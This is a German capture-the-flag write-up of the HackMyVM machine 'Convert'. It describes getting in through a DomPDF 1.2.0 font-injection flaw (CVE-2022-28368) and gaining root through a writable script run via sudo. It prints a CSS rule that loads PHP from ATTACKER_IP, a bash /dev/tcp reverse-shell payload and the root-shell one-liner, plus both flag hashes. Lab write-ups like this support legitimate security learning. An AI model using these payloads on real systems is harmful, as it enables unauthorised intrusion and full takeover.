# Convert - HackMyVM (Easy)

![Convert Icon](Convert.png)

## Übersicht

*   **VM:** Convert
*   **Plattform:** [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Convert)
*   **Schwierigkeit:** Easy
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 7. Mai 2024
*   **Original-Writeup:** https://alientec1908.github.io/Convert_HackMyVM_Easy/
*   **Autor:** Ben C.

## Kurzbeschreibung

Die virtuelle Maschine "Convert" von HackMyVM (Schwierigkeitsgrad: Easy) wurde durch die Ausnutzung einer Remote Code Execution (RCE) Schwachstelle in der PDF-Generierungsbibliothek DomPDF (Version 1.2.0, CVE-2022-28368) kompromittiert. Durch das Einschleusen einer präparierten CSS-Datei, die ihrerseits eine manipulierte Font-Datei (mit PHP-Reverse-Shell-Code) von einem externen Server lud, wurde initialer Zugriff als Benutzer `eva` erlangt. Die Privilegienerweiterung zu Root erfolgte durch die Ausnutzung einer unsicheren `sudo`-Regel, die es `eva` erlaubte, ein Python-Skript in ihrem Home-Verzeichnis als Root auszuführen. Dieses Skript konnte manipuliert werden, um eine Root-Shell zu starten.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `vi` / `nano`
*   `dirb`
*   `nmap`
*   `nikto`
*   `gobuster`
*   `wget`
*   `strings`
*   `python3 http.server`
*   `echo`
*   `exiftool`
*   `curl`
*   Online Morse Decoder (nicht im Log, aber erwähnt im Tool-Verzeichnis – hier nicht direkt relevant)
*   `find`
*   `cp`
*   `cat`
*   `md5sum`
*   `pip3` (nicht im Log, aber erwähnt im Tool-Verzeichnis)
*   `python3` (für Shell-Stabilisierung und Exploit)
*   `nc` (netcat)
*   Standard Linux-Befehle (`ls`, `mkdir`, `id`, `sudo`, `rm`, `bash`, `ssh`, `cd`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Convert" erfolgte in diesen Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   Ziel-IP (`192.168.2.119`, Hostname `convert.hmv`) via `arp-scan` und `/etc/hosts` identifiziert.
    *   `nmap` zeigte offene Ports 22 (SSH 9.2p1) und 80 (Nginx 1.22.1, Titel "HTML to PDF").
    *   `dirb` und `gobuster` fanden `/index.php` und das Verzeichnis `/upload/`.
    *   Eine generierte PDF-Datei im `/upload/`-Verzeichnis wurde heruntergeladen. `exiftool` und `strings` zeigten, dass die PDF mit `dompdf 1.2.0 + CPDF` erstellt wurde.
    *   Fehlermeldungen bei der Konvertierung deuteten auf den Webroot-Pfad (`/var/www/html/`) und eine mögliche SSRF-Anfälligkeit hin.

2.  **Initial Access (DomPDF RCE - CVE-2022-28368):**
    *   Die DomPDF-Version 1.2.0 ist anfällig für RCE via CSS Font-Face Injection (CVE-2022-28368).
    *   **Vorbereitung auf Angreifer-Seite:**
        1.  Eine bösartige CSS-Datei (`evil.css`) wurde erstellt, die eine `@font-face`-Regel enthielt, welche eine PHP-Datei von einem Angreifer-Server als Font-Quelle lud (`src: url('http://ATTACKER_IP:9001/evil.php');`).
        2.  Eine PHP-Datei (`evil.php`) wurde erstellt, die eine Bash-Reverse-Shell-Payload enthielt (`<?php system("bash -i >& /dev/tcp/ATTACKER_IP:4444 0>&1'"); ?>`). Um von DomPDF als Font erkannt zu werden, wurde diese Payload in eine legitime `.ttf`-Datei eingebettet oder die Datei wurde als `.php` mit Font-ähnlichem Inhalt gespeichert.
        3.  Ein Python-HTTP-Server wurde auf Port 9001 gestartet, um `evil.css` und `evil.php` bereitzustellen.
        4.  Ein Netcat-Listener wurde auf Port 4444 gestartet, um die Reverse Shell zu empfangen.
    *   **Exploit-Ausführung:**
        1.  Eine `index.html`-Datei wurde auf dem Angreifer-Server erstellt, die nur einen Link zur `evil.css` enthielt: ``.
        2.  Ein weiterer Python-HTTP-Server wurde auf Port 8000 gestartet, um diese `index.html` bereitzustellen.
        3.  Die URL dieser `index.html` (`http://ATTACKER_IP:8000/index.html`) wurde an die Konvertierungsfunktion von `convert.hmv` übergeben (impliziert durch die Server-Logs).
    *   DomPDF auf `convert.hmv` lud die `index.html` vom Angreifer, welche die `evil.css` nachlud. Die `evil.css` wies DomPDF an, `evil.php` (die PHP-Reverse-Shell) als Font zu laden und auszuführen.
    *   Eine Reverse Shell als Benutzer `eva` wurde erfolgreich etabliert.

3.  **Privilege Escalation (eva zu root via sudo python):**
    *   Die Shell als `eva` wurde stabilisiert und SSH-Zugriff eingerichtet.
    *   Die User-Flag wurde aus `/home/eva/user.txt` gelesen.
    *   Im Home-Verzeichnis von `eva` befand sich ein Python-Skript `pdfgen.py`.
    *   `sudo -l` für `eva` zeigte: `(ALL : ALL) NOPASSWD: /usr/bin/python3 /home/eva/pdfgen.py *`.
    *   Da `eva` Schreibrechte auf ihr eigenes Home-Verzeichnis und somit auf `pdfgen.py` hatte, wurde die Datei manipuliert.
    *   Der Inhalt von `/home/eva/pdfgen.py` wurde durch `import os; os.system("/bin/bash")` ersetzt.
    *   Durch Ausführung von `sudo -u root /usr/bin/python3 /home/eva/pdfgen.py beliebiger_text` wurde das manipulierte Skript als `root` ausgeführt, was zu einer Root-Shell führte.
    *   Die Root-Flag wurde aus `/root/root.txt` gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Veraltete Software (DomPDF 1.2.0):** Anfällig für RCE (CVE-2022-28368) durch CSS Font-Face Injection.
*   **Server-Side Request Forgery (SSRF) in PDF-Generierung:** Die Anwendung versuchte, URLs intern aufzulösen, was den Exploit ermöglichte.
*   **Unsichere `sudo`-Konfiguration:** Erlaubte die Ausführung eines Python-Skripts, auf das der Benutzer Schreibrechte hatte, als `root`. Dies ist ein klassischer Vektor für Privilege Escalation.
*   **Informationslecks:** Fehlermeldungen gaben den Webroot-Pfad preis.
*   **Directory Browsing (impliziert durch Upload-Verzeichnis-Struktur).**

## Flags

*   **User Flag (`/home/eva/user.txt`):** `f2be48d6f922bfc0a9bf45b22887c10d`
*   **Root Flag (`/root/root.txt`):** `1cc872dad04d177e6732abbedf1e525b`

## Tags

`HackMyVM`, `Convert`, `Easy`, `DomPDF`, `CVE-2022-28368`, `RCE`, `CSS Injection`, `SSRF`, `Web`, `Sudo Privilege Escalation`, `Python`, `Linux`
